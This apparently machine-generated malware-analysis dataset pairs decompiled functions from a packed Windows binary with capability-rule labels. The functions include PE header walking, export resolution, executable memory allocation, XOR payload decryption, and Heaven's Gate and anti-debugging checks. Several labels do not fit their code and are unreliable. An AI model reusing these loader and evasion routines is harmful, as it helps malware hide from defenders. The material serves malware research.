{
    "00401330": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Removing unreachable block (ram,0x004013eb)\n\nuint16_t __cdecl fcn.00401330(uint arg_8h)\n\n{\n    uint var_bp_ch;\n    \n    if ((0x60 < arg_8h) && (arg_8h < 0x7b)) {\n        arg_8h._0_2_ = arg_8h - 0x20;\n    }\n    return arg_8h;\n}\n",
        "token_count": 113
    },
    "004016e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Removing unreachable block (ram,0x00401772)\n\nint16_t * fcn.004016e0(void)\n\n{\n    uint32_t *puVar1;\n    code *pcStack56;\n    uint var_bp_ch;\n    \n    pcStack56 = fcn.004016e0;\n    do {\n        if (*pcStack56 == 0x5a4d) {\n            puVar1 = pcStack56 + *(pcStack56 + 0x3c);\n            if ((*puVar1 == 'P') && ((*puVar1 & 0xff) + (*puVar1 >> 8 & 0xff) == 0x95)) {\n                return pcStack56;\n            }\n        }\n        pcStack56 = pcStack56 + -0x1000 & 0xfffff000;\n    } while( true );\n}\n",
        "token_count": 198
    },
    "004021b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040221a)\n\nint32_t * __cdecl fcn.004021b0(int32_t arg_8h)\n\n{\n    int32_t *piStack32;\n    \n    piStack32 = arg_8h + *(arg_8h + 0x3c);\n    if (*piStack32 != 0x4550) {\n        piStack32 = NULL;\n    }\n    return piStack32;\n}\n",
        "token_count": 101
    },
    "00401410": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint * __cdecl fcn.00401410(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint16_t uVar1;\n    int16_t iVar2;\n    int16_t iVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    bool bVar6;\n    uint *puStack120;\n    uint32_t uStack100;\n    uint var_ch;\n    \n    iVar4 = fcn.004012d0();\n    puVar5 = *(iVar4 + 0xc) + 0x14;\n    puStack120 = *puVar5;\n    do {\n        if (puStack120 == puVar5) {\n            return NULL;\n        }\n        uVar1 = *(puStack120 + 9);\n        iVar4 = puStack120[10];\n        if ((puStack120[4] == arg_ch) && (arg_ch != 0)) {\n            return puStack120 + -2;\n        }\n        bVar6 = false;\n        if (arg_8h != 0) {\n            for (uStack100 = 0; uStack100 < uVar1 / 2; uStack100 = uStack100 + 1) {\n                iVar2 = fcn.00401330(*(iVar4 + uStack100 * 2));\n                iVar3 = fcn.00401330(*(arg_8h + uStack100 * 2));\n                bVar6 = iVar3 == iVar2;\n                if ((iVar2 == 0) || (!bVar6)) break;\n            }\n        }\n        if (bVar6) {\n            return puStack120[4];\n        }\n        puStack120 = *puStack120;\n    } while( true );\n}\n",
        "token_count": 384
    },
    "00401840": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004018f6)\n// WARNING: Removing unreachable block (ram,0x004018ba)\n\nuint __cdecl fcn.00401840(int32_t arg_8h)\n\n{\n    uint var_24h;\n    uint var_20h;\n    uint var_1ah;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    if (arg_8h == 0) {\n        var_10h = fcn.004016e0();\n    }\n    else {\n        var_10h = fcn.00401410(arg_8h, 0);\n    }\n    return var_10h;\n}\n",
        "token_count": 152
    },
    "00401bb0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_8h\n\nuint __cdecl fcn.00401bb0(int32_t arg_8h)\n\n{\n    uint arg_8h_00;\n    uint uStack40;\n    uint var_bp_8h;\n    \n    if (arg_8h == 0) {\n        uStack40 = 0;\n    }\n    else {\n        arg_8h_00 = fcn.00401a50();\n        uStack40 = fcn.00401c80(arg_8h_00, arg_8h);\n    }\n    return uStack40;\n}\n",
        "token_count": 135
    },
    "00401c80": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.00401c80(uint arg_8h, int32_t arg_ch)\n\n{\n    uint16_t uVar1;\n    uint16_t uVar2;\n    uint16_t uStack96;\n    uint16_t uStack94;\n    int32_t iStack92;\n    uint uStack88;\n    uint16_t uStack82;\n    uchar auStack76 [36];\n    uint32_t uStack40;\n    uint16_t uStack22;\n    uint var_ch;\n    \n    uStack22 = 0x5f1b;\n    uStack40 = 0x41f072f1;\n    uStack82 = 0xefed;\n    if (((arg_ch != 0) && (fcn.004019a0(auStack76, str.Qc_U, 0x18),  arg_ch != 0)) &&\n       (*0x405264 = fcn.00401e20(auStack76),  *0x405264 != NULL)) {\n        iStack92 = arg_ch;\n        uStack96 = fcn.00401100(arg_ch);\n        uVar1 = uStack82;\n        if (uStack96 != (uStack40 ^ 0x41f072f1)) {\n            uVar2 = uStack22 ^ 0xcc41;\n            uStack88 = 0;\n            uStack94 = uStack96;\n            (**0x405264)(arg_8h, &uStack96, 0x5f1b - uStack22, &uStack88);\n            if (uVar2 <= uVar1) {\n                return uStack88;\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 376
    },
    "00402330": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402330(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_28h;\n    uint var_20h;\n    uint var_1ch;\n    uint32_t var_18h;\n    uint var_14h;\n    uint var_ch;\n    \n    if ((arg_8h != 0) && (arg_ch != 0)) {\n        iVar1 = fcn.004021b0(arg_ch);\n        var_28h = iVar1 + 0x18 + *(iVar1 + 0x14);\n        for (var_18h = 0; var_18h < *(iVar1 + 6); var_18h = var_18h + 1) {\n            fcn.00402260(arg_8h, arg_ch, var_28h, var_18h, *(iVar1 + 0x54));\n            var_28h = var_28h + 0x28;\n        }\n    }\n    return;\n}\n",
        "token_count": 243
    },
    "00402410": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nuint __cdecl fcn.00402410(uint arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    uint uStack40;\n    uint var_bp_ch;\n    \n    if (*0x405270 == NULL) {\n        uStack40 = 0;\n    }\n    else {\n        uVar1 = 4;\n        if (arg_ch != 0) {\n            uVar1 = 0x40;\n        }\n        uStack40 = (**0x405270)(0, arg_8h, *0x405268 + -0x25cac2, uVar1);\n    }\n    return uStack40;\n}\n",
        "token_count": 155
    },
    "004024d0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_eh\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.004024d0(int32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_3ch;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_eh;\n    \n    var_eh._0_2_ = -0x695b;\n    var_14h = 0x36937b56;\n    fcn.004019a0(&var_3ch, 0x4041c3, 0xe);\n    *0x405270 = fcn.00401bb0(&var_3ch);\n    if (*0x405270 == 0) {\n        if (var_eh != 0x49ef) {\n            var_18h = 0;\n        }\n    }\n    else {\n        var_18h = fcn.00402410(*0x40526c - (0x36f59b13 - var_14h), var_14h + -0x36937b55);\n        if (var_18h == 0) {\n            var_18h = 0;\n        }\n        else {\n            iVar1 = 0x36d37b56 - var_14h;\n            fcn.00402330(var_18h, arg_ch);\n            *(arg_8h + 0x54) = var_18h;\n            *(arg_8h + 0x58) = var_18h - iVar1;\n            var_18h = var_18h + 0x2d26;\n        }\n    }\n    return var_18h;\n}\n",
        "token_count": 417
    },
    "00402c30": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_80h\n// WARNING: Variable defined which should be unmapped: var_7ch\n// WARNING: Variable defined which should be unmapped: var_78h\n// WARNING: Variable defined which should be unmapped: var_dh\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.00402c30(void)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_6eh;\n    code *var_44h;\n    uint var_40h;\n    uint var_39h;\n    uint8_t var_21h;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    uint32_t var_18h;\n    uint var_14h;\n    uint var_dh;\n    \n    var_dh._0_1_ = 1;\n    var_18h = 0x37624661;\n    var_20h = 0x2f4e56fe;\n    fcn.004019a0(&var_39h, str.Ld_ai, 0x12);\n    var_44h = fcn.00401bb0(&var_39h);\n    if (var_44h == NULL) {\n        uVar1 = var_18h + 0xc89db99f;\n    }\n    else {\n        iVar2 = var_18h + 0xc89db99f;\n        iVar3 = (*var_44h)(var_18h ^ 0x37624261, var_18h ^ 0x37624660, &var_39h, var_18h + 0xc89db9a9, &var_74h, iVar2, \n                           &var_39h, 0x37624661);\n        if (iVar3 == iVar2) {\n            uVar1 = var_18h ^ 0x37624661;\n        }\n        else {\n            var_21h = var_dh & 1;\n            if (((var_6eh & (var_18h ^ 0x37624761)) != 0x37624661 - var_18h) &&\n               (var_21h = var_dh & 1,  (var_6eh & var_18h + 0xc89db9a0) == var_18h + 0xc89db99f)) {\n                var_21h = ((var_6eh & 0x37624861 - var_18h) != var_18h + 0xc89db99f ^ var_dh) & 1;\n            }\n            uVar1 = var_21h;\n            if ((var_18h ^ 0x594c7167) == var_20h) {\n                uVar1 = var_1ch;\n            }\n        }\n    }\n    var_1ch = uVar1;\n    return var_1ch;\n}\n",
        "token_count": 675
    },
    "00402dd0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nbool __cdecl fcn.00402dd0(code *arg_8h, uint arg_ch)\n\n{\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_8h != NULL) {\n        (*arg_8h)(arg_ch, 1, arg_8h, arg_ch);\n    }\n    return arg_8h != NULL;\n}\n",
        "token_count": 156
    },
    "00402e40": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint32_t fcn.00402e40(void)\n\n{\n    int32_t iVar1;\n    uint auStack172 [2];\n    uint uStack164;\n    uchar auStack156 [52];\n    uint uStack104;\n    int32_t iStack100;\n    int32_t iStack80;\n    int32_t iStack76;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    int32_t iStack36;\n    uint32_t uStack32;\n    int32_t iStack28;\n    uint uStack24;\n    uint uStack20;\n    uint16_t uStack14;\n    uint32_t uStack12;\n    \n    uStack12 = 0x3ca05073;\n    iStack36 = 0;\n    fcn.004029b0(auStack172);\n    uStack20 = 0xffffffff;\n    uStack24 = 0xd6004fa6;\n    uStack104 = auStack172[0];\n    uStack48 = *0x405250;\n    uStack44 = *0x405254;\n    uStack40 = *0x405258;\n    uStack52 = *0x40525c;\n    uStack56 = *0x405260;\n    iStack80 = fcn.00401840(0);\n    if (iStack80 == 0) {\n        uStack32 = 0x3ca05037 - uStack12;\n    }\n    else if (iStack80 == 1) {\n        uStack32 = uStack12 ^ 0xc35fafc3;\n    }\n    else {\n        iStack100 = uStack12 + 0xc35ffa09;\n        iVar1 = fcn.004021b0(iStack80);\n        iStack76 = *(iVar1 + 0x50);\n        iStack100 = *0x405274 - iStack100;\n        if (iStack76 == 0x3ca05073 - uStack12) {\n            uStack32 = 0x3ca0502d - uStack12;\n        }\n        else {\n            uStack14 = uStack14 ^ 0x9696;\n            iStack28 = fcn.004024d0(auStack156, uStack164);\n            if (iStack28 == 0) {\n                uStack32 = 0x3ca05041 - uStack12;\n            }\n            else {\n                iStack36 = uStack12 + 0xc35faf8e;\n                uStack32 = fcn.00402dd0(iStack28, auStack156);\n            }\n        }\n    }\n    return uStack32;\n}\n",
        "token_count": 579
    },
    "null": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint entry0(void)\n\n{\n    uint32_t uVar1;\n    uint32_t unaff_EBX;\n    uint32_t unaff_EBP;\n    \n    uVar1 = ((unaff_EBP << 1 ^ unaff_EBX) & 0x10) + 3;\n    *0x405260 = *0x10;\n    if (uVar1 != 0) {\n        *0x405258 = unaff_EBX;\n        *0x40525c = unaff_EBP;\n        uVar1 = fcn.00403860();\n        if (1 < uVar1) {\n            uVar1 = fcn.004034e0();\n            *0x40525c = uVar1;\n        }\n    }\n    do {\n    } while (uVar1 != 0x35);\n    return 0;\n}\n",
        "token_count": 184
    },
    "00401e20": {
        "rules": [
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nint32_t __cdecl fcn.00401e20(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    bool bVar3;\n    uint32_t uStack124;\n    uint32_t uStack108;\n    uint32_t uStack60;\n    int32_t iStack56;\n    uint16_t *puStack52;\n    uint var_bp_ch;\n    \n    fcn.00401bb0(0);\n    iStack56 = fcn.00401900();\n    iVar1 = fcn.004021b0(iStack56);\n    iVar1 = iStack56 + *(iVar1 + 0x78);\n    uStack108 = 0xffffffff;\n    puStack52 = iStack56 + *(iVar1 + 0x24);\n    uStack60 = 0;\n    do {\n        if (*(iVar1 + 0x18) <= uStack60) {\ncode_r0x00401f8a:\n            if (uStack108 == 0xffffffff) {\n                iStack56 = 0;\n            }\n            else {\n                iStack56 = iStack56 + *(iStack56 + *(iVar1 + 0x1c) + uStack108 * 4);\n            }\n            return iStack56;\n        }\n        iVar2 = iStack56 + *(iStack56 + *(iVar1 + 0x20) + uStack60 * 4);\n        bVar3 = false;\n        for (uStack124 = 0;\n            (((uStack124 < 0x20 &&\n              (bVar3 = *(iVar2 + uStack124) == *(arg_8h + uStack124),  *(iVar2 + uStack124) != '\\0')) &&\n             (*(arg_8h + uStack124) != '\\0')) && (bVar3)); uStack124 = uStack124 + 1) {\n        }\n        if (bVar3) {\n            uStack108 = *puStack52;\n            goto code_r0x00401f8a;\n        }\n        puStack52 = puStack52 + 1;\n        uStack60 = uStack60 + 1;\n    } while( true );\n}\n",
        "token_count": 487
    },
    "00402680": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nvoid __cdecl fcn.00402680(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint32_t uStack312;\n    uint32_t auStack300 [62];\n    uint16_t uStack52;\n    char cStack49;\n    uint32_t uStack48;\n    uint32_t uStack44;\n    uint32_t uStack40;\n    uint8_t uStack35;\n    int16_t iStack34;\n    uint var_bp_ch;\n    \n    iStack34 = 0x12d7;\n    uStack35 = 0x33;\n    uStack40 = 0x496ba2d3;\n    uStack52 = 0xb975;\n    fcn.00401130(auStack300, 0x404210, 0xf8);\n    uVar2 = uStack40 ^ 0x496ba2ed;\n    for (uStack48 = uStack40 ^ 0x496ba2d3; uStack48 < uStack40 + 0xb6945d6b;\n        uStack48 = uStack48 + (0x496ba2d4 - uStack40)) {\n        uStack312 = auStack300[uStack48];\n        uStack44 = uStack312;\n        for (; uStack312 < arg_10h; uStack312 = uStack312 + uVar2) {\n            do {\n                cStack49 = (uStack35 ^ 0xcc) + *(arg_ch + uStack312);\n            } while (uStack52 <= iStack34 - 9U);\n            cVar1 = fcn.004025e0(uStack312 % (0x496ba311 - uStack40));\n            *(arg_8h + uStack312) = cStack49 - cVar1;\n        }\n    }\n    return;\n}\n",
        "token_count": 430
    },
    "004034e0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid fcn.004034e0(void)\n\n{\n    uint uStack92;\n    uint uStack76;\n    uint32_t auStack52 [3];\n    uint32_t uStack40;\n    uint32_t uStack32;\n    uint uStack28;\n    uint var_ch;\n    \n    uStack40 = 0x51154f4f;\n    for (auStack52[0] = 0; auStack52[0] != (uStack40 ^ 0x51154f50);\n        auStack52[0] = (uStack40 ^ 0x51154f4e) + auStack52[0]) {\n        uStack32 = uStack32 * 2 & 0x6bfae33d;\n        uStack28 = 0;\n        (*_sym.imp.KERNEL32.dll_SetHandleCount)(0x51155afd - uStack40);\n        (*_sym.imp.GDI32.dll_MoveToEx)(0xc603a4, uStack76, uStack76, auStack52);\n        (*_sym.imp.KERNEL32.dll_ReleaseMutex)(0x132dff);\n        (*_sym.imp.KERNEL32.dll_OpenThread)(uStack92, auStack52, 0xc603a4);\n    }\n    return;\n}\n",
        "token_count": 287
    },
    "00403860": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint32_t fcn.00403860(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint arg_8h;\n    uint uStack124;\n    uint uStack108;\n    uint uStack104;\n    uint32_t uStack48;\n    uint32_t uStack40;\n    uint var_ch;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_GetCommandLineW)();\n    fcn.00403730();\n    (*_sym.imp.KERNEL32.dll_CancelSynchronousIo)(0);\n    iVar2 = fcn.00402c30();\n    if (iVar2 == uStack40 + 0xa7fd352f) {\n        uStack48 = uStack40 + 0xa7fd352f;\n    }\n    else {\n        uVar3 = fcn.00403660(_sym.imp.KERNEL32.dll_CreateMutexW);\n        if (uVar3 == (uStack40 ^ 0x5802cad1)) {\n            fcn.00403390();\n            arg_8h = fcn.00403b10(uStack40 ^ 0x5802cad1);\n            iVar2 = fcn.00403800(arg_8h);\n            if (iVar2 == uStack40 + 0xa7fd352f) {\n                uStack48 = (*_sym.imp.KERNEL32.dll_SetConsoleTextAttribute)(0x6530de, 0x68a3);\n                (*_sym.imp.USER32.dll_MoveWindow)\n                          (0x877fe, 0x5802ccc0 - iVar1, 0x5802ccc0 - iVar1, uStack108, uStack40 ^ 0x5802ccd9, uStack104)\n                ;\n                (*_sym.imp.KERNEL32.dll_AttachConsole)(uStack124);\n            }\n            else {\n                uStack48 = uStack40 ^ 0x5802cad0;\n            }\n        }\n        else {\n            if (uStack40 + 0xf35299c == uStack40 + 0xfe80a0ad) {\n                func_0x00401000();\n                return 0xac37ade0 - uStack40;\n            }\n            uStack48 = uStack40 ^ 0x5802cad0;\n            fcn.004034e0();\n        }\n    }\n    return uStack48;\n}\n",
        "token_count": 526
    },
    "00401010": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_8h\n\nint32_t __cdecl fcn.00401010(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t in_FS_OFFSET;\n    int32_t iStack56;\n    int32_t iStack52;\n    uint var_bp_8h;\n    \n    if (arg_ch == 1) {\n        for (iStack52 = 0; *(arg_8h + iStack52) != '\\0'; iStack52 = iStack52 + 1) {\n        }\n        iStack56 = iStack52;\n    }\n    else {\n        if (arg_ch != 3) {\n            do {\n                invalidInstructionException();\n            } while( true );\n        }\n        iStack56 = *(in_FS_OFFSET + arg_8h);\n    }\n    return iStack56;\n}\n",
        "token_count": 189
    },
    "00401a50": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid fcn.00401a50(void)\n\n{\n    uint32_t uVar1;\n    int16_t aiStack148 [32];\n    int32_t iStack84;\n    uint32_t uStack80;\n    uint32_t uStack76;\n    char acStack72 [32];\n    int32_t iStack40;\n    ushort uStack34;\n    uint32_t uStack32;\n    int32_t iStack28;\n    uchar uStack21;\n    uint var_ch;\n    \n    iStack28 = 0;\n    uStack32 = 0x3b43683;\n    iStack40 = 0x63db07f1;\n    uStack80 = 0x2884abc9;\n    uStack76 = 0;\n    fcn.004019a0(acStack72, str.pd_, 0xe);\n    for (iStack84 = 0x63db07f1 - iStack40; iStack84 != 0x63db0811 - iStack40;\n        iStack84 = iStack84 + iStack40 + -0x63db07f0) {\n        uStack34 = 0x6dfd;\n        aiStack148[iStack84] = acStack72[iStack84];\n        uVar1 = -(0x820e5be3 < uStack32) - iStack28;\n        if (uVar1 < uStack76 || uVar1 - uStack76 < (0x820e5be3 - uStack32 < uStack80)) break;\n    }\n    fcn.00401840(aiStack148);\n    return;\n}\n",
        "token_count": 358
    },
    "00402260": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_dh\n\nvoid __cdecl fcn.00402260(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, uint arg_18h)\n\n{\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_21h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_dh;\n    \n    if (arg_14h == 0) {\n        fcn.00401130(arg_8h, arg_ch, arg_18h);\n    }\n    fcn.00401130(*(arg_10h + 0xc) + arg_8h, arg_ch + *(arg_10h + 0x14), *(arg_10h + 0x10));\n    return;\n}\n",
        "token_count": 225
    },
    "004025e0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00402663)\n\nuint8_t __cdecl fcn.004025e0(uint32_t arg_8h)\n\n{\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint8_t var_19h;\n    uint var_18h;\n    uint var_10h;\n    uint var_ch;\n    \n    if (arg_8h < 0x3e) {\n        var_19h = str._ZG2[arg_8h] ^ 0xb3;\n    }\n    else {\n        var_19h = 0;\n    }\n    return var_19h;\n}\n",
        "token_count": 148
    },
    "00402860": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402860(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_18h;\n    uint var_12h;\n    \n    *(arg_8h + arg_10h) = (*(arg_ch + arg_10h) - arg_14h) + -1;\n    return;\n}\n",
        "token_count": 118
    },
    "00402900": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Removing unreachable block (ram,0x00402946)\n\nvoid __cdecl fcn.00402900(int32_t arg_8h, int32_t *arg_ch)\n\n{\n    uint var_bp_4h;\n    \n    arg_ch[3] = *0x405278 + -0x8ac91e0;\n    arg_ch[1] = *0x405274 + -0x4a7c;\n    *arg_ch = arg_8h + 0x5722;\n    arg_ch[2] = arg_8h + 0x5c9;\n    return;\n}\n",
        "token_count": 149
    },
    "004029b0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_9h\n// WARNING: Removing unreachable block (ram,0x004029e6)\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.004029b0(uint arg_8h)\n\n{\n    int32_t arg_8h_00;\n    uint32_t uVar1;\n    int32_t arg_10h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint32_t var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    int32_t var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    int32_t var_2ch;\n    uint32_t var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint32_t var_10h;\n    uint var_9h;\n    \n    var_10h = 0x50a3fc0e;\n    var_20h = 0;\n    var_58h = 0;\n    var_24h = fcn.004028f0();\n    for (var_28h = 0; var_28h < (var_10h ^ 0x50a3fc06); var_28h = var_28h + var_10h + 0xaf5c03f3) {\n        var_18h = *(var_24h + var_28h * 0x3c + 0x28);\n        var_2ch = var_20h;\n        if (0x5c5f4583 - var_10h != 0x56e14f9e - var_10h) {\n            var_20h = (*(var_24h + var_28h * 0x3c + 0x2c) - var_18h) + var_20h;\n        }\n    }\n    var_68h = var_10h ^ 0x50a3fc0e;\n    uVar1 = var_10h ^ 0x50a3fc0e;\n    fcn.004019a0(&var_4ch, 0x4041c3, var_10h ^ 0x50a3fc00);\n    *0x405270 = fcn.00401bb0(&var_4ch);\n    arg_8h_00 = fcn.00402410(var_20h, uVar1);\n    for (; var_68h < 0x50a3fc16 - var_10h; var_68h = var_10h + 0xaf5c03f3 + var_68h) {\n        var_1ch = *(var_68h * 0x3c + var_24h + 0x30);\n        var_9h._0_1_ = 0x8e - var_9h;\n        arg_10h = *(var_24h + var_68h * 0x3c + 0x2c) - *(var_24h + var_68h * 0x3c + 0x28);\n        fcn.00401130(arg_8h_00 + var_58h, var_1ch, arg_10h);\n        var_9h._0_1_ = var_9h ^ 0xff;\n        var_58h = arg_10h + var_58h;\n    }\n    fcn.00402680(arg_8h_00, arg_8h_00, var_20h);\n    uVar1 = var_10h ^ 0x50a3fc0e;\n    fcn.00402900(arg_8h_00, arg_8h);\n    return uVar1;\n}\n",
        "token_count": 918
    },
    "00403040": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
